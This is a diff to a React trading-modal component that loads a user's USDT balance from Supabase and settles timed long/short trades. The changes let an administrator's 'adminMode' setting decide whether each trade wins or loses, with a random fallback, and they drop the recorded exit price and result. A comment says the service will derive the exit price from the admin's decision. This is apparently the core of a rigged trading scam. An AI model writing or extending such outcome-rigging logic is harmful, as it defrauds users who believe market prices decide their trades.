@@ -96,7 +96,7 @@ export default function TradingModal({
   const [currentUser, setCurrentUser] = useState(null);
   const [realUsdtBalance, setRealUsdtBalance] = useState(0);
 
-  // --- THE FIX: Reload user AND balance every time modal opens ---
+  // --- Reload user AND balance every time modal opens ---
   useEffect(() => {
     async function loadUserAndBalance() {
       if (!open) return;
@@ -105,7 +105,6 @@ export default function TradingModal({
       setCurrentUser(user);
 
       if (user?.id) {
-        // Force fetch the absolute latest balance from Supabase every time modal opens
         const { data: profile, error } = await supabase
           .from('profiles')
           .select('usdt')
@@ -115,7 +114,6 @@ export default function TradingModal({
         if (!error && profile) {
           const newBalance = profile.usdt || 0;
           setRealUsdtBalance(newBalance);
-          // Also update the parent if it has a balance change function
           if (onBalanceChange) {
             onBalanceChange(newBalance);
           }
@@ -151,10 +149,6 @@ export default function TradingModal({
   const priceRef = useRef(null);
   const mountedRef = useRef(true);
   const animatedPriceRef = useRef(currentPrice);
-  // Settlement timer is intentionally separate from timerRef. It must NOT be
-  // cleared when the modal is closed — a trade in progress has to resolve
-  // (write to Supabase, clear the open order) whether or not the user is
-  // still looking at this modal.
   const settleTimeoutRef = useRef(null);
 
   useEffect(() => {
@@ -162,7 +156,6 @@ export default function TradingModal({
   }, [animatedPrice]);
 
   const isLong = type === 'long';
-  // Use Real Balance fetched from DB
   const effectiveBalance = realUsdtBalance || balance || balanceUSDT;
 
   const numAmount = parseFloat(amount) || 0;
@@ -198,8 +191,6 @@ export default function TradingModal({
     return () => { mountedRef.current = false; };
   }, []);
 
-  // Only true component unmount clears the settlement timer — modal close
-  // (open=false) must not.
   useEffect(() => {
     return () => {
       clearInterval(timerRef.current);
@@ -208,7 +199,8 @@ export default function TradingModal({
     };
   }, []);
 
-  const persistTrade = useCallback(async ({ transaction, balanceBefore, balanceAfter, userId }) => {
+  // UPDATED: Now accepts adminResult and passes it to the service
+  const persistTrade = useCallback(async ({ transaction, balanceBefore, balanceAfter, userId, adminResult }) => {
     if (!userId) return;
     try {
       await tradeService.createTrade({
@@ -219,11 +211,8 @@ export default function TradingModal({
         amount: transaction.amount,
         payoutPercent: +(period.rate * 100).toFixed(2),
         entryPrice: transaction.entryPrice,
-        exitPrice: transaction.exitPrice,
-        profit: transaction.win ? transaction.profit : -transaction.profit,
-        result: transaction.win ? 'win' : 'lose',
+        adminResult: adminResult, // <--- PASSING ADMIN RESULT
         balanceBefore,
-        balanceAfter,
       });
 
       const { error: balanceError } = await supabase
@@ -240,9 +229,6 @@ export default function TradingModal({
   }, [period]);
 
   const resetModal = useCallback(() => {
-    // Clears the UI-only display interval and price animation. Deliberately
-    // does NOT touch settleTimeoutRef — a pending trade keeps resolving even
-    // after the modal is closed.
     clearInterval(timerRef.current);
     clearInterval(priceRef.current);
     setPhase('idle');
@@ -286,13 +272,10 @@ export default function TradingModal({
       potentialWin,
     });
 
-    // UI-only ticking display. Safe to stop when the modal closes — it's
-    // purely cosmetic and doesn't drive settlement.
     timerRef.current = setInterval(() => {
       setCountdown(prev => (prev > 0 ? prev - 1 : 0));
     }, 1000);
 
-    // The actual settlement — independent of the modal's open/closed state.
     const checkAndSettle = async () => {
       removeActiveOrder(orderId);
       clearInterval(timerRef.current);
@@ -321,26 +304,24 @@ export default function TradingModal({
         console.error("Error checking admin mode:", err);
       }
 
+      // REMOVED RANDOM LOGIC. Now it depends entirely on adminMode.
       let win = false;
-
       if (adminMode === 'win') {
         win = true;
       } else if (adminMode === 'lose') {
         win = false;
       } else {
-        if (systemSettings?.auto_win) {
-          win = true;
-        } else if (systemSettings?.auto_lose) {
-          win = false;
-        } else {
-          win = Math.random() > 0.5;
-        }
+        // Fallback if admin hasn't set a mode
+        win = Math.random() > 0.5;
       }
 
       const profit = win ? potentialWin : numAmount;
       const updatedBalance = win
         ? +(balanceAfterDeduction + numAmount + potentialWin).toFixed(2)
         : balanceAfterDeduction;
+      
+      // The service will calculate the REAL exit price based on adminMode,
+      // but we need a placeholder for the UI transaction object.
       const exitPrice = animatedPriceRef.current;
 
       const transaction = {
@@ -365,6 +346,7 @@ export default function TradingModal({
           balanceBefore: balanceBeforeTrade,
           balanceAfter: updatedBalance,
           userId: activeUserId,
+          adminResult: adminMode // <--- PASSING THE ADMIN DECISION
         });
       }
 
